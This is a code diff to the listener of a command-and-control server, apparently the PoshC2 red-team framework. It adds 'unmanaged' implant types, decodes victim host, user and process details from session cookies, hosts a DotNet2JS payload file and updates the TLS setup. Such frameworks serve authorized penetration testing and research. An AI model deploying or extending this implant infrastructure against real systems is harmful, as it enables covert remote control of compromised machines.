@@ -121,6 +121,10 @@ class MyHandler(BaseHTTPRequestHandler):
             # register new implant
             elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
                 implant_type = ImplantType.PowerShellHttp
+                if self.path == f"{new_implant_url}?n":
+                    implant_type = ImplantType.UnmanagedHttp
+                if self.path == f"{new_implant_url}?p?n":
+                    implant_type = ImplantType.UnmanagedHttpProxy
                 if self.path == f"{new_implant_url}?p":
                     implant_type = ImplantType.PowerShellHttpProxy
                 if self.path == f"{new_implant_url}?d":
@@ -202,6 +206,18 @@ class MyHandler(BaseHTTPRequestHandler):
                                                                 url_id)
                     display(new_linux_implant)
                     response_content = encrypt(base_encryption_key, new_implant.linux_core)
+
+                elif implant_type.is_unmanaged_implant():
+                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
+                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
+                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
+                    user, domain, hostname, process_name, architecture, process_id, url_id = decrypted_session_cookie.split(";")
+                    url_id = url_id.replace("\x00", "")
+                    new_unmanaged_implant, unmanaged_core = new_implant(ip_address, implant_type, str(domain), str(user),
+                                                                        str(hostname), architecture, process_id,
+                                                                        str(process_name).lower().replace(".exe", ""), url_id)
+                    display(new_unmanaged_implant)
+                    response_content = encrypt(base_encryption_key, unmanaged_core)
 
                 elif implant_type.is_powershell_implant():
                     encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
@@ -473,6 +489,16 @@ def add_default_hosted_payloads():
     insert_object(hosted_file)
 
     hosted_file = HostedFile(
+        uri=f"{hosted_file_url}_cs",
+        file_path=f"{PayloadsDirectory}Posh_v4_DotNet2JS.js",
+        content_type="text/html",
+        base64="No",
+        active="Yes"
+    )
+
+    insert_object(hosted_file)
+
+    hosted_file = HostedFile(
         uri=f"{hosted_file_url}_py",
         file_path=f"{PayloadsDirectory}aes.py",
         content_type="text/html",
@@ -550,14 +576,16 @@ def main(args):
     if not UseHttp:
         cert_file = f"{PoshProjectDirectory}posh.crt"
         key_file = f"{PoshProjectDirectory}posh.key"
-
+        
         if (os.path.isfile(cert_file)) and (os.path.isfile(key_file)):
-            try:
-                httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=key_file, certfile=cert_file, server_side=True,
-                                               ssl_version=ssl.PROTOCOL_TLS)
+            try: 
+                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+                ssl_context.load_cert_chain(cert_file, key_file)
+                httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True) 
             except Exception:
-                httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=key_file, certfile=cert_file, server_side=True,
-                                               ssl_version=ssl.PROTOCOL_TLSv1)
+                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+                ssl_context.load_cert_chain(cert_file, key_file)
+                httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
         else:
             raise ValueError("Cannot find the certificate files")
 
